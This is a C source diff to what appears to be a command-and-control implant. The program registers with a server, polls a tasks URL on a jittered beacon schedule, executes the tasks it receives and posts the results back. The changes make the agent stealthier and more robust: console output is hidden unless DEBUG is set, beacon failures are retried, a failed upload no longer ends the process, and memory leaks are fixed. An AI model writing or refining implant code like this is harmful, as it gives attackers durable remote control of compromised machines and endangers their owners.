@@ -52,7 +52,9 @@ int main(void){
 #endif
         return 1;
     }
+#ifdef DEBUG
     printf("%s\n", agent_id);
+#endif
 
     tasks = json_array();
     if (!tasks) {
@@ -81,8 +83,14 @@ int main(void){
         //join / cancel the other one?
         return 1;
     }
-    pthread_join(beacon_th, NULL);
-    pthread_join(task_th, NULL);
+    char *beacon_exit; //the exit status of the threads and handling exit needs work
+    pthread_join(beacon_th, (void **)&beacon_exit);
+    if (beacon_exit == NULL) {
+        pthread_cancel(task_th);
+    }
+    else {
+        pthread_join(task_th, NULL);
+    }
 
     pthread_mutex_destroy(&tasks_mutex);
     pthread_mutex_destroy(&conf_mutex);
@@ -145,6 +153,7 @@ char *agent_init(void) {
     //parsing response (uuid) into json
     json_error_t jerror;
     json_t *root = json_loadb(response_buf.response, response_buf.size, 0, &jerror);
+    free(response_buf.response);
     if (!root)
     {
 #ifdef DEBUG
@@ -190,7 +199,7 @@ void *beacon_routine(void *) {
         return NULL;
     }
     sprintf(full_url, TASKS_URL "?id=%s", agent_id);
-    //int fails = 0; //reset on each success
+    int fails = MAX_FAIL_RETRY; //reset on each success
     while (1) {
         pthread_mutex_lock(&conf_mutex);
         struct timespec t = compute_sleep_time(beacon_config.mean_delay, beacon_config.jitter);
@@ -211,14 +220,17 @@ void *beacon_routine(void *) {
         rc_curl = curl_easy_perform(curl);
         if (rc_curl != CURLE_OK) {
 #ifdef DEBUG
-            fprintf(stderr, "curl_easy_perform: %s", curl_easy_strerror(rc_curl));
+            fprintf(stderr, "curl_easy_perform: %s\n", curl_easy_strerror(rc_curl));
 #endif
             curl_easy_cleanup(curl);
-            free(full_url); //
-            //fails++;
-            return NULL;
-            //continue;
+            if (fails >= 5) {
+                free(full_url);
+                return NULL;
+            }
+            fails++;
+            continue;
         }
+        fails = 0;
         curl_easy_cleanup(curl);
 #ifdef DEBUG
         fwrite(response_buf.response, 1, response_buf.size, stdout);
@@ -227,6 +239,7 @@ void *beacon_routine(void *) {
         //parsing response (task array) into json
         json_error_t jerror;
         json_t *root = json_loadb(response_buf.response, response_buf.size, 0, &jerror);
+        free(response_buf.response);
         if (!root)
         {
 #ifdef DEBUG
@@ -314,11 +327,11 @@ void *task_routine(void *) {
             result = task_conf(options);
         }
         else { //no match
-            result = json_pack("s:s", "error", "unsupported task category");
+            result = json_pack("{s:s}", "error", "unsupported task category");
         }
         json_decref(options);
         if (!result) {
-            result = json_pack("s:s", "error", "task servicing error");
+            result = json_pack("{s:s}", "error", "task servicing error");
             if (!result) {
                 result = json_object(); //empty
                 if (!result) {
@@ -371,15 +384,17 @@ void *task_routine(void *) {
         rc_curl = curl_easy_perform(curl);
         curl_slist_free_all(headers);
         free(post_str);
+        curl_easy_cleanup(curl);
         if (rc_curl != CURLE_OK) {
 #ifdef DEBUG
             fprintf(stderr, "curl_easy_perform: %s", curl_easy_strerror(rc_curl));
 #endif
-            curl_easy_cleanup(curl);
-            exit(EXIT_FAILURE);
+            //exit(EXIT_FAILURE);
         }
-        curl_easy_cleanup(curl);
+#ifdef DEBUG
         fwrite(response_buf.response, 1, response_buf.size, stdout);
+#endif
+        free(response_buf.response);
     } //endloop
 
 }
